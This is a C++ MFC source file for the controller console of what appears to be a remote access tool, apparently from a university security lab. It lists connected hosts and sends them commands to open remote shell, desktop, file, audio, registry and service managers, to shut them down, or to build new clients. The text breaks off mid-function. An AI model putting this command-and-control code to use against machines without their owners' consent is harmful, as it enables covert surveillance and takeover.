
// ServerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"
#include "afxdialogex.h"
#include "DlgServerSet.h"
#include"DlgRemoteMessage.h"
#include"DlgCmdManager.h"
#include"DlgCreateClient.h"
#include"DlgProcessManager.h"
#include"DlgWindowManager.h"
#include"DlgRemoteControl.h"
#include"DlgFileManager.h"
#include"DlgAudioManager.h"
#include"DlgServiceManager.h"
#include"DlgRegisterManager.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

COLUMN_DATA __Column_Data_Online[]=
{
	{"IP",      150},
	{"计算机名/备注",    180},
	{"操作系统",         180},
	{"CPU",              150},
	{"摄像头",           100},
	{"Ping",             110}
};
COLUMN_DATA __Column_Data_Message[] =
{
	{ "信息类型",         200 },
	{ "时间",             200 },
	{ "信息内容",         450 }
};
UINT __Indicators[] =
{
	IDR_STATUSBAR_SERVER_STRING
};
#define  UM_BUTTON_CMD_MANAGER  WM_USER+0x10
#define  UM_NOTIFY_ICON_DATA    WM_USER+0x20

//定义配置文件的全局对象
CConfigFile   __ConfigFile;
//定义通信引擎的全局指针
_CIOCPServer*  __IOCPServer = NULL;
//定义窗口类的全局指针
CServerDlg*  __ServerDlg = NULL;

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框
class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CServerDlg 对话框



CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_SERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_Bitmap[0].LoadBitmap(IDB_BITMAP_FINDER);
	__ServerDlg = this;
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SERVER_DIALOG_ONLINE, m_CListCtrl_Server_Dialog_Online);
	DDX_Control(pDX, IDC_LIST_SERVER_DIALOG_MESSAGE, m_CListCtrl_Server_Dialog_Message);
}

BEGIN_MESSAGE_MAP(CServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_COMMAND(ID_MENU_SERVER_DIALOG_SET, &CServerDlg::OnMenuServerDialogSet)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_EXIT, &CServerDlg::OnMenuServerDialogExit)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_ADD, &CServerDlg::OnMenuServerDialogAdd)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER_DIALOG_ONLINE, &CServerDlg::OnNMRClickListServerDialogOnline)
	ON_COMMAND(ID_MENU_LIST_SERVER_DIALOG_ONLINE_DISCONNECTION, &CServerDlg::OnMenuListServerDialogOnlineDisconnection)
	ON_COMMAND(ID_MENU_LIST_SERVER_DIALOG_ONLINE_MESSAGE, &CServerDlg::OnMenuListServerDialogOnlineMessage)
	ON_COMMAND(ID_MENU_LIST_SERVER_DIALOG_ONLINE_SHUTDOWN, &CServerDlg::OnMenuListServerDialogOnlineShutdown)
	
	ON_COMMAND(IDM_TOOLBAR_SERVER_CMD_MAMAGER, &CServerDlg::OnOpenCmdManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_PROCESS_MAMAGER, &CServerDlg::OnOpenProcessManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_WINDOW_MAMAGER, &CServerDlg::OnOpenWindowManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_REMOTE_CONTROLL_MAMAGER, &CServerDlg::OnOpenRemoteControl)
	ON_COMMAND(IDM_TOOLBAR_SERVER_FILE_MAMAGER, &CServerDlg::OnOpenFileManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_AUDIO_MAMAGER, &CServerDlg::OnOpenAudioManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_CLEAN_MAMAGER, &CServerDlg::OnOpenCleanManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_VIDEO_MAMAGER, &CServerDlg::OnOpenVideoManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_SERVICE_MAMAGER, &CServerDlg::OnOpenServiceManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_REGISTER_MAMAGER, &CServerDlg::OnOpenRegisterManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_SERVER_MAMAGER, &CServerDlg::OnOpenServerManager)
	ON_COMMAND(IDM_TOOLBAR_SERVER_CREATE_CLIENT, &CServerDlg::OnOpenCreateClient)
	ON_COMMAND(IDM_TOOLBAR_SERVER_ABOUT, &CServerDlg::OnOpenServerAbout)

	
	ON_WM_SIZE()
	
	ON_WM_CLOSE()
	/**************************************************************/
	/*     托盘消息                                               */
	/**************************************************************/
	ON_MESSAGE(UM_NOTIFY_ICON_DATA, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnNotifyIconData)
	ON_COMMAND(ID_NOTIFYICONDATA_SHOW, &CServerDlg::OnNotifyicondataShow)
	ON_COMMAND(ID_NOTIFYICONDATA_EXIT, &CServerDlg::OnNotifyicondataExit)
	ON_WM_TIMER()

	/**************************************************************/
	/*     自定义消息                                             */
	/**************************************************************/
	//用户上线
	ON_MESSAGE(UM_CLIENT_LOGIN,OnClientLogin)
	//远程消息
	ON_MESSAGE(UM_OPEN_REMOTE_MESSAGE_DIALOG, OnRemoteMessageManager)
	//CMD管理
	ON_MESSAGE(UM_OPEN_CMD_MANAGER_DIALOG, OnOpenCmdManagerDialog)
	//进程管理
	ON_MESSAGE(UM_OPEN_PROCESS_MANAGER_DIALOG, OnProcessManager)
	//窗口管理
	ON_MESSAGE(UM_OPEN_WINDOW_MANAGER_DIALOG, OnOpenWindowManagerDialog)
	//远程控制	
	ON_MESSAGE(UM_OPEN_REMOTE_CONTROL_DIALOG, OnRemoteControlDialog)
	//文件管理
	ON_MESSAGE(UM_OPEN_FILE_MANAGER_DIALOG, OnOpenFileManagerDialog)
	//音频管理
	ON_MESSAGE(UM_OPEN_AUDIO_MANAGER_DIALOG, OnOpenAudioManagerDialog)
	//视频管理
//	ON_MESSAGE(UM_OPEN_VIDEO_MANAGER_DIALOG, OnOpenVideoManagerDialog)
	//服务管理
	ON_MESSAGE(UM_OPEN_SERVICE_MANAGER_DIALOG, OnOpenServiceManagerDialog)
	//注册表管理
	ON_MESSAGE(UM_OPEN_REGISTER_MANAGER_DIALOG, OnOpenRegisterManagerDialog)
END_MESSAGE_MAP()


// CServerDlg 消息处理程序

BOOL CServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	InitTrueToolBar();
	InitListControl();
	InitSolidMenu();
	InitStatusBar();
	InitNotifyIconData();
	SetTimer(1, 100, NULL);                                                     //设置100毫秒刷新一次（定时器）
	m_ListenPort = __ConfigFile.GetInt("Settings", "ListenPort");              //读取ini文件中的监听端口
	m_MaxConnection = __ConfigFile.GetInt("Settings", "MaxConnection");        //读取ini文件中的最大连接数
	ServerStart();
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
//初始化控件
VOID CServerDlg::InitListControl()
{
	for (int i = 0; i < sizeof(__Column_Data_Online) / sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Dialog_Online.InsertColumn(i, __Column_Data_Online[i].TitleData,
			LVCFMT_CENTER, __Column_Data_Online[i].TitleWidth);
	}
	m_CListCtrl_Server_Dialog_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < sizeof(__Column_Data_Message) / sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Dialog_Message.InsertColumn(i, __Column_Data_Message[i].TitleData,
			LVCFMT_CENTER, __Column_Data_Message[i].TitleWidth);
	}
	m_CListCtrl_Server_Dialog_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
}
//初始化固态菜单
VOID CServerDlg::InitSolidMenu()
{
	HMENU  Menu;
	Menu = LoadMenu(NULL, MAKEINTRESOURCE(IDC_MENU_SERVER_DIALOG_MAIN));
	::SetMenu(this->GetSafeHwnd(), Menu);
	::DrawMenuBar(this->GetSafeHwnd());

}

//主对话框设置
void CServerDlg::OnMenuServerDialogSet()
{
	// 弹出一个对话框
	CDlgServerSet  Dialog;
	Dialog.DoModal();
}

//主对话框退出
void CServerDlg::OnMenuServerDialogExit()
{
	// TODO: 在此添加命令处理程序代码
	SendMessage(WM_CLOSE);
}

//主对话框添加
void CServerDlg::OnMenuServerDialogAdd()
{
	// TODO: 在此添加命令处理程序代码
	int i = m_CListCtrl_Server_Dialog_Online.InsertItem(m_CListCtrl_Server_Dialog_Online.GetItemCount(), "李旭");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 1, "19");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 2, "雄武将军");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 3, "隋");
}


void CServerDlg::OnNMRClickListServerDialogOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	//Online控件列表鼠标右键点击消息
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码

	CMenu   Menu;
	//加载菜单资源
	Menu.LoadMenu(IDR_LIST_SERVER_DIALOG_ONLINE_MENU); 
	CMenu*  SubMenu = Menu.GetSubMenu(0);
	//获得鼠标位置
	CPoint  Point;
	GetCursorPos(&Point);

	//获得菜单上子项的个数
	int  count = SubMenu->GetMenuItemCount();

/*
   //若无选中，菜单变黑（更好的是菜单不出现）
	if (m_CListCtrl_Server_Dialog_Online.GetSelectedCount() == 0)
	{
		for (int i = 0; i < count; i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
	}
*/

	Menu.SetMenuItemBitmaps(ID_MENU_LIST_SERVER_DIALOG_ONLINE_DISCONNECTION, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_MENU_LIST_SERVER_DIALOG_ONLINE_MESSAGE, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_MENU_LIST_SERVER_DIALOG_ONLINE_SHUTDOWN, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);

	//在鼠标位置显示菜单
	if (m_CListCtrl_Server_Dialog_Online.GetSelectedCount() != 0)
	{
		SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
	}
	*pResult = 0;

}
void CServerDlg::SendingSelectedCommand(PBYTE  BufferData, ULONG BufferLength)
{
	//从ListCtrl上的隐藏项中选中Context
	POSITION  Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
	while (Position)
	{
		int  i = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		//获得该排的隐藏数据项
		CONTEXT_OBJECT*  ContextObject = (CONTEXT_OBJECT*)m_CListCtrl_Server_Dialog_Online.GetItemData(i);
		__IOCPServer->OnPreSending(ContextObject, BufferData, BufferLength);
	}
}
//OnlineList菜单消息(删除连接)
void CServerDlg::OnMenuListServerDialogOnlineDisconnection()
{
	// TODO: 在此添加命令处理程序代码
	BYTE IsToken = CLIENT_GET_OUT_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));

	//清除ListCtrl列表
	CString  ClientAddress;
	int   SelectedCount = m_CListCtrl_Server_Dialog_Online.GetSelectedCount();
	for (int i = 0; i < SelectedCount; i++)
	{
		POSITION   Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
		int   Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		ClientAddress = m_CListCtrl_Server_Dialog_Online.GetItemText(Item, 0);
		m_CListCtrl_Server_Dialog_Online.DeleteItem(Item);
		ClientAddress += "强制断开";
		ShowDialogMessage(TRUE, ClientAddress);
	}
}

//OnlineList菜单消息(即时消息)
void CServerDlg::OnMenuListServerDialogOnlineMessage()
{
	// TODO: 在此添加命令处理程序代码
	BYTE  IsToken = CLIENT_REMOTE_MESSAGE_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));

}
//远程消息
LRESULT  CServerDlg::OnRemoteMessageManager(WPARAM wParam, LPARAM lParam)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgRemoteMessage*  DlgRemoteMessage = new CDlgRemoteMessage(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	DlgRemoteMessage->Create(IDD_DIALIG_REMOTE_MESSAGE, GetDesktopWindow());
	DlgRemoteMessage->ShowWindow(SW_SHOW);
	return 0;
}

//OnlineList菜单消息(远程关机)
void CServerDlg::OnMenuListServerDialogOnlineShutdown()
{
	// TODO: 在此添加命令处理程序代码
	BYTE  IsToken = CLIENT_SHUT_DOWN_REQUEST;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	
	CString  ClientAddress;
	int  SelectCount = m_CListCtrl_Server_Dialog_Online.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectCount; i++)
	{
		POSITION   Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
		int   Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		ClientAddress = m_CListCtrl_Server_Dialog_Online.GetItemText(Item, 0);
		m_CListCtrl_Server_Dialog_Online.DeleteItem(Item);
		ClientAddress += "强制断开";
		ShowDialogMessage(TRUE, ClientAddress);
	}
}
void CServerDlg::ShowDialogMessage(BOOL IsOk, CString  Message)
{
	CString  v1;
	CString  v2;
	CString  v3;
	CTime  Time = CTime::GetCurrentTime();
	v2 = Time.Format("%H:%M:%S");
	if (IsOk)
	{
		v1 = L"执行成功";
	}
	else
	{
		v1 = L"执行失败";
	}
	m_CListCtrl_Server_Dialog_Message.InsertItem(0, v1);
	m_CListCtrl_Server_Dialog_Message.SetItemText(0, 1, v2);
	m_CListCtrl_Server_Dialog_Message.SetItemText(0, 2, Message);
	if (Message.Find("上线") > 0)
	{
		m_ConnectionCount++;
	}
	else if (Message.Find("下线") > 0)
	{
		m_ConnectionCount--;
	}
	else if (Message.Find("断开") > 0)
	{
		m_ConnectionCount--;
	}
	m_ConnectionCount = (m_ConnectionCount <= 0 ? 0 : m_ConnectionCount);
	v3.Format("有%d个主机在线", m_ConnectionCount);
	m_StatusBar.SetPaneText(0, v3);   //在状态条上显示文字
}
void CServerDlg::InitStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(__Indicators, sizeof(__Indicators) / sizeof(UINT)))
	{
		return;
	}
	CRect  v1;
	GetWindowRect(&v1);
	v1.bottom += 1;
	MoveWindow(v1);
}
void CServerDlg::InitTrueToolBar()
{
	if (!m_TrueToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_TrueToolBar.LoadToolBar(IDR_TOOLBAR_SERVER_MAIN))
	{
		return ;      // fail to create
	}
	m_TrueToolBar.LoadTrueColorToolBar(
		48,    //加载真彩工具条    
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN);
	RECT   v1, v2;
	GetWindowRect(&v2);
	v1.left = 0;
	v1.top = 0;
	v1.bottom = 80;
	v1.right = v2.right - v2.left + 10;
	m_TrueToolBar.MoveWindow(&v1, TRUE);

	m_TrueToolBar.SetButtonText(0, "终端管理");
	m_TrueToolBar.SetButtonText(1, "进程管理");
	m_TrueToolBar.SetButtonText(2, "窗口管理");
	m_TrueToolBar.SetButtonText(3, "桌面管理");
	m_TrueToolBar.SetButtonText(4, "文件管理");
	m_TrueToolBar.SetButtonText(5, "语音管理");
	m_TrueToolBar.SetButtonText(6, "系统清理");
	m_TrueToolBar.SetButtonText(7, "视频管理");
	m_TrueToolBar.SetButtonText(8, "服务管理");
	m_TrueToolBar.SetButtonText(9, "注册表管理");
	m_TrueToolBar.SetButtonText(10, "服务端设置");
	m_TrueToolBar.SetButtonText(11, "客户端管理");
	m_TrueToolBar.SetButtonText(12, "帮助");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);   //显示
}
void CServerDlg::InitNotifyIconData()
{
	m_NotifyIconData.cbSize = sizeof(NOTIFYICONDATA);
	m_NotifyIconData.hWnd = m_hWnd;
	m_NotifyIconData.uID = IDR_MAINFRAME;
	m_NotifyIconData.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
	m_NotifyIconData.uCallbackMessage = UM_NOTIFY_ICON_DATA;
	m_NotifyIconData.hIcon = m_hIcon;
	CString  v1 = "长安大学安全实验室";
	lstrcpyn(m_NotifyIconData.szTip, v1, sizeof(m_NotifyIconData.szTip) / sizeof(m_NotifyIconData.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_NotifyIconData);
}
void CServerDlg::OnNotifyIconData(WPARAM wPARAM, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
	{
		if (!IsWindowVisible())
		{
			ShowWindow(SW_SHOW);
		}
		else
		{
			ShowWindow(SW_HIDE);
		}
		break;
	}
	case  WM_RBUTTONDOWN:
	{
		CMenu  Menu;
		Menu.LoadMenu(IDR_MENU_NOTIFY_ICON_DATA);
		CPoint  Point;
		GetCursorPos(&Point);
		//	SetForegroundWindow();    //设置当前窗口
		Menu.GetSubMenu(0)->TrackPopupMenu(TPM_LEFTBUTTON | TPM_RIGHTBUTTON, Point.x, Point.y, this, NULL);
		//	PostMessage(WM_USER, 0, 0);
		break;
	}
	}
}
void CServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (m_StatusBar.m_hWnd != NULL)                  //状态栏
	{
		CRect  Rect;
		Rect.top = cy - 20;
		Rect.right = cx;
		Rect.left = 0;
		Rect.bottom = cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx);
	}
	if (m_TrueToolBar.m_hWnd != NULL)                //工具条
	{
		CRect  Rect;
		Rect.top = Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = 80;
		m_TrueToolBar.MoveWindow(Rect);
	}
}
//CMD管理
void CServerDlg::OnOpenCmdManager()
{
	POSITION Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
	if (Position)
	{
		BYTE  IsToken = CLIENT_CMD_MANAGER_REQUIRE;
		SendingSelectedCommand(&IsToken, sizeof(BYTE));
	}
	return;
}
LRESULT CServerDlg::OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgCmdManager*  DlgCmdManager = new CDlgCmdManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	DlgCmdManager->Create(IDD_DIALOG_CMD_MANAGER, GetDesktopWindow());
	DlgCmdManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = CMD_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgCmdManager;
	return 0;
}

//进程管理
void CServerDlg::OnOpenProcessManager()
{
	BYTE  IsToken = CLIENT_PROCESS_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
}
LRESULT  CServerDlg::OnProcessManager(WPARAM wParam, LPARAM lParam)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgProcessManager*  DlgProcessManager = new CDlgProcessManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	DlgProcessManager->Create(IDD_DIALOG_PROCESS_MANAGER, GetDesktopWindow());
	DlgProcessManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = PROCESS_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgProcessManager;
	return 0;
}
//窗口管理
void CServerDlg::OnOpenWindowManager()
{
	BYTE  IsToken = CLIENT_WINDOW_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT  CServerDlg::OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgWindowManager*  DlgWindowManager = new CDlgWindowManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	DlgWindowManager->Create(IDD_DIALOG_WINDOW_MANAGER, GetDesktopWindow());
	DlgWindowManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = WINDOW_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgWindowManager;
	return 0;
}
//远程控制
void CServerDlg::OnOpenRemoteControl()
{
	BYTE  IsToken = CLIENT_REMOTE_CONTROL_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT  CServerDlg::OnRemoteControlDialog(WPARAM wParam, LPARAM lParam)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgRemoteControl*  DlgRemoteControl = new CDlgRemoteControl(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	DlgRemoteControl->Create(IDD_DIALOG_REMOTE_CONTROL, GetDesktopWindow());
	DlgRemoteControl->ShowWindow(SW_SHOW);

	ContextObject->DialogID = REMOTE_CONTROL_DIALOG;
	ContextObject->DialogHandle = DlgRemoteControl;
	return 0;
}
//文件管理
void CServerDlg::OnOpenFileManager()
{
	BYTE  IsToken = CLIENT_FILE_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT  CServerDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgFileManager*  DlgFileManager = new CDlgFileManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	DlgFileManager->Create(IDD_DIALOG_FILE_MANAGER, GetDesktopWindow());
	DlgFileManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = FILE_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgFileManager;
	return 0;
}
//语音管理
void CServerDlg::OnOpenAudioManager()
{
	BYTE  IsToken = CLIENT_AUDIO_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT  CServerDlg::OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam)
{
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgAudioManager*  DlgAudioManager = new CDlgAudioManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	DlgAudioManager->Create(IDD_DIALOG_AUDIO_MANAGER, GetDesktopWindow());
	DlgAudioManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = AUDIO_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgAudioManager;
	return 0;
}
void CServerDlg::OnOpenCleanManager()
{
	MessageBox("OnOpenCleanManager", "OnOpenCleanManager");
	return;
}
void CServerDlg::OnOpenVideoManager()
{
	MessageBox("OnOpenVideoManager", "OnOpenVideoManager");
	return;
}
//服务管理
void CServerDlg::OnOpenServiceManager()
{
	BYTE  IsToken = CLIENT_SERVICE_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CServerDlg::OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam)
{
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgServiceManager*  DlgServiceManager = new CDlgServiceManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	DlgServiceManager->Create(IDD_DIALOG_SERVICE_MANAGER, GetDesktopWindow());
	DlgServiceManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = SERVICE_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgServiceManager;
	return 0;
}
//注册表管理
void CServerDlg::OnOpenRegisterManager()
{
	BYTE  IsToken = CLIENT_REGISTER_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
LRESULT CServerDlg::OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam)
{
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)lParam;
	CDlgRegisterManager*  DlgRegisterManager = new CDlgRegisterManager(this, __IOCPServer, ContextObject);
	//设置父窗口为桌面
	DlgRegisterManager->Create(IDD_DIALOG_REGISTER_MANAGER, GetDesktopWindow());
	DlgRegisterManager->ShowWindow(SW_SHOW);

	ContextObject->DialogID = REGISTER_MANAGER_DIALOG;
	ContextObject->DialogHandle = DlgRegisterManager;
	return 0;
}
void CServerDlg::OnOpenServerManager()
{
	MessageBox("OnOpenServerManager", "OnOpenServerManager");
	return;
}
//客户端生成
void CServerDlg::OnOpenCreateClient()
{
	CDlgCreateClient  Dialog;
	Dialog.DoModal();
	return;
}
void CServerDlg::OnOpenServerAbout()
{
	MessageBox("OnOpenServerAbout", "OnOpenServerAbout");
	return;
}

void CServerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
//	if (::MessageBox(NULL, "你确定？", "Remote", MB_OKCANCEL) == IDOK)
//	{
		Shell_NotifyIcon(NIM_DELETE, &m_NotifyIconData);
		//销毁通信引擎的类对象
		if (__IOCPServer != NULL)
		{
			delete  __IOCPServer;
			__IOCPServer = NULL;
		}
		CDialogEx::OnClose();
//	}
	

}


void CServerDlg::OnNotifyicondataShow()
{
	// TODO: 在此添加命令处理程序代码
}


void CServerDlg::OnNotifyicondataExit()
{
	// TODO: 在此添加命令处理程序代码
	CDialogEx::OnClose();
}
void CServerDlg::ServerStart()
{
	__IOCPServer = new _CIOCPServer;         //动态申请类对象
	if (__IOCPServer == NULL)
	{
		return;
	}
	if (__IOCPServer->ServerRun(m_ListenPort, WindowNotifyProcedure) == TRUE)
	{

	}
	//窗口界面上显示通信类对象已经启动
	CString   v1;
	v1.Format("监听端口：%d成功",m_ListenPort);
	ShowDialogMessage(TRUE, v1);
	return;
}
void  CALLBACK  CServerDlg::WindowNotifyProcedure(PCONTEXT_OBJECT  ContextObject)
{
	WindowHandleIO(ContextObject);
}
void  CServerDlg::WindowHandleIO(CONTEXT_OBJECT*  ContextObject)
{
	if (ContextObject == NULL)
	{
		return;
	}
	if (ContextObject->DialogID > 0)
	{
		switch (ContextObject->DialogID)
		{
		case  CMD_MANAGER_DIALOG:
		{
			CDlgCmdManager*  Dialog = (CDlgCmdManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case PROCESS_MANAGER_DIALOG:
		{
